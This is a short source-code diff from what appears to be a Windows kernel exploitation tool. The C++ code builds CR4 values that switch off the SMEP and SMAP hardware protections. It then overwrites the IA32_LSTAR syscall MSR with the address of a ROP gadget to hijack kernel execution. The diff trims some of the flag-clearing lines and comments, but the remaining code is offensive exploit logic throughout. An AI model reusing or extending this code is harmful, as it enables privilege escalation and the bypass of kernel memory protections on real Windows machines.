@@ -46,14 +46,8 @@ namespace vdm
 				.process_context_identifiers;
 
 		m_smep_off.flags = cr4_value.flags;
-		m_smep_off.smep_enable = false;
-		
-		// if your cpu supports SMAP and your on 19H1 or above SMAP will be used...
-		m_smep_off.smap_enable = false; 
-
-		// WARNING: some virtual machines dont have SMEP...
-		// my VMWare VM doesnt... nor does my Virtual Box VM...
 		m_smep_on.flags = cr4_value.flags;
+		
 		m_smep_on.smep_enable = cpuid_features.ebx.smep;
 		m_smep_on.smap_enable = cpuid_features.ebx.smap;
 
@@ -185,7 +179,7 @@ namespace vdm
 		SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
 		SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
 
-		// set LSTAR to first rop gadget... race begins here...
+		// set LSTAR to first rop gadget... 
 		if (!wrmsr(IA32_LSTAR_MSR, m_pop_rcx_gadget))
 			std::printf("> failed to set LSTAR...\n");
 		else
